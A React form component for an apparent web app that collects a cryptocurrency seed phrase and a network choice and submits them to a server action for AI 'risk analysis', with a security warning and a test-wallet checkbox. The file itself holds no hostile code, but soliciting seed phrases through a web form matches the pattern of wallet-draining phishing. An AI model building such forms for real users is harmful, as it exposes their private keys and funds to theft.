"use client";

import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Loader2, AlertTriangle } from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Textarea } from "@/components/ui/textarea";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Card, CardContent } from "@/components/ui/card";
import { handleAnalysis } from "@/app/actions";
import { useToast } from "@/hooks/use-toast";
import type { AnalyzeSeedPhraseForRiskOutput } from "@/ai/flows/analyze-seed-phrase-for-risk";

const formSchema = z.object({
  seedPhrase: z
    .string()
    .trim()
    .min(1, "Seed phrase cannot be empty.")
    .refine(
      (phrase) => phrase.split(/\s+/).filter(Boolean).length >= 12,
      "A valid seed phrase must contain at least 12 words."
    ),
  network: z.string().min(1, "Please select a network."),
  confirmRisk: z.literal(true, {
    errorMap: () => ({
      message: "You must acknowledge the risks to proceed.",
    }),
  }),
});

type SeedPhraseFormProps = {
  onAnalysisComplete: (data: AnalyzeSeedPhraseForRiskOutput | null) => void;
  onAnalysisStart: () => void;
};

export function SeedPhraseForm({
  onAnalysisComplete,
  onAnalysisStart,
}: SeedPhraseFormProps) {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      seedPhrase: "",
      network: "",
      confirmRisk: false,
    },
  });

  const confirmRiskValue = form.watch("confirmRisk");

  async function onSubmit(values: z.infer<typeof formSchema>) {
    setIsSubmitting(true);
    onAnalysisStart();

    const formData = new FormData();
    formData.append("seedPhrase", values.seedPhrase);
    formData.append("network", values.network);

    const result = await handleAnalysis(formData);

    setIsSubmitting(false);

    if (result.success && result.data) {
      onAnalysisComplete(result.data);
    } else {
      toast({
        variant: "destructive",
        title: "Analysis Failed",
        description:
          result.error ||
          "An unknown error occurred. Please try again later.",
      });
      onAnalysisComplete(null);
    }
  }

  return (
    <Card>
      <CardContent className="p-6">
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <FormField
              control={form.control}
              name="seedPhrase"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Seed Phrase</FormLabel>
                  <FormControl>
                    <Textarea
                      placeholder="Enter your 12, 18, or 24-word seed phrase here..."
                      className="resize-none"
                      rows={4}
                      {...field}
                    />
                  </FormControl>
                  <FormDescription>
                    Your seed phrase will not be stored. It is used only for this
                    one-time analysis.
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="network"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Blockchain Network</FormLabel>
                  <Select
                    onValueChange={field.onChange}
                    defaultValue={field.value}
                  >
                    <FormControl>
                      <SelectTrigger>
                        <SelectValue placeholder="Select a network" />
                      </SelectTrigger>
                    </FormControl>
                    <SelectContent>
                      <SelectItem value="Ethereum">Ethereum</SelectItem>
                      <SelectItem value="Bitcoin">Bitcoin</SelectItem>
                      <SelectItem value="Solana">Solana</SelectItem>
                      <SelectItem value="Polygon">Polygon</SelectItem>
                      <SelectItem value="BNB Smart Chain">
                        BNB Smart Chain
                      </SelectItem>
                    </SelectContent>
                  </Select>
                  <FormMessage />
                </FormItem>
              )}
            />

            <Alert variant="destructive" className="bg-destructive/10">
              <AlertTriangle className="h-4 w-4 !text-destructive" />
              <AlertTitle className="font-bold">Security Warning!</AlertTitle>
              <AlertDescription>
                Entering your seed phrase into any website is extremely risky and
                can lead to a total loss of your funds. Only proceed if you
                are using a temporary, empty wallet for testing purposes.
              </AlertDescription>
            </Alert>

            <FormField
              control={form.control}
              name="confirmRisk"
              render={({ field }) => (
                <FormItem className="flex flex-row items-start space-x-3 space-y-0 rounded-md p-4 border border-destructive/50">
                  <FormControl>
                    <Checkbox
                      checked={field.value}
                      onCheckedChange={field.onChange}
                      className="mt-0.5"
                    />
                  </FormControl>
                  <div className="space-y-1 leading-none">
                    <FormLabel>
                      I understand the risk and I am not using a wallet with
                      real funds.
                    </FormLabel>
                    <FormMessage />
                  </div>
                </FormItem>
              )}
            />

            <Button
              type="submit"
              disabled={!confirmRiskValue || isSubmitting}
              className="w-full bg-accent hover:bg-accent/90"
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Analyzing...
                </>
              ) : (
                "Analyze Seed Phrase"
              )}
            </Button>
          </form>
        </Form>
      </CardContent>
    </Card>
  );
}
